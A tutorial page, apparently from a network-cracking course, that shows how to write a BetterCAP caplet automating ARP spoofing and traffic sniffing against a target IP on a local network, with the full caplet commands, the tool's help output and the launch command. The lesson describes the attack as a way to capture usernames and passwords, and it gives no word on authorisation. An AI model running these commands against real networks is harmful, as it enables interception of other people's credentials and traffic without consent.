---
title: Creating a Custom Spoofing Script
type: default
layout: page
child: Cracking
fold: Network Cracking
---

In the previous lessons, we learned how to use BetterCAP to discover all the
clients on our same network, run an ARP Spoofing attack to intercept the data
and then sniff data to see the usernames, passwords and everything that's
getting sent over the network. In order to do this, we have to run a lot
of commands, first of all, we had to run `net.probe on` to turn on the
probe module, we had to set the settings for the `arp.spoof` module, turn
it on and turn the sniffing module on.

Every time you want to run an ARP Spoofing attack and spy your targets, you are
going to do all the steps previously mentioned, or if you would like to make
this process automatically, you can create a caplet, which is exactly what I
want to show you in this lesson.

> A caplet is just a text file that contains all the commands that you want to run
> .

To create a caplet, create a text file using the editor of your choice, emacs,
vim, nano, ed, etcetera and let's go through all the commands we had to run to
create our caplet.

The first thing that we had to run, was `net.probe on`, so let's copy that
command and let's paste it in our text file. The next thing that we made, was
to modify the settings of the _arp.spoof_ module, we executed _set
arp.spoof.fullduplex true_, then we set the target(s) IP with the command
_set arp.spoof.targets 192.168.1.7_ (make sure that every time you run this
caplet, you make sure that the target's IP address stays the same), then, we
turned on the _arp.spoof_ module by executing _arp.spoof on_ and finally we also
run the sniffer by doing _net.sniff on_. You caplet file should look like the
following:

```bash
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.7
arp.spoof on
net.sniff on
```

Once you have finished pasting the commands, we can now save the file, I will
set mine's name as _arp.cap_.

Once we have finished, all we have to do now, is feed the caplet file to
Bettercap before we start it, so all the commands will be executed
automatically. As we currently don't know how to do this, let's execute
_bettercap --help_ to see all the BetterCAP options.

```bash
Usage of ./bettercap:
  -autostart string
        Comma separated list of modules to auto start. (default "events.stream")
  -caplet string
        Read commands from this file and execute them in the interactive session.
  -cpu-profile file
        Write cpu profile file.
  -debug
        Print debug messages.
  -env-file string
        Load environment variables from this file if found, set to empty to disable environment persistence.
  -eval string
        Run one or more commands separated by ; in the interactive session, used to set variables via command line.
  -gateway-override string
        Use the provided IP address instead of the default gateway. If not specified or invalid, the default gateway will be used.
  -iface string
        Network interface to bind to, if empty the default interface will be auto selected.
  -mem-profile file
        Write memory profile to file.
  -no-colors
        Disable output color effects.
  -no-history
        Disable interactive session history file.
  -silent
        Suppress all logs which are not errors.
  -version
        Print the version and exit.
```

The option we want to use is the _-caplet_ option. So, we are going to execute
BetterCAP like we used to do it, first of all, we do _bettercap_ followed by
_-iface_ to specify the interface that is connected to the target network, in my
case it is _enp1s0_ and now, we are going to append _-caplet_ followed by the
path of the file we created previously. If you saved your file in your home
directory, for example, the command will look like this:

```bash
bettercap -iface enp1s0 -caplet ~/arp.cap
```

Once you execute that command, the modules and the settings specified on the
caplet file will be automatically applied.
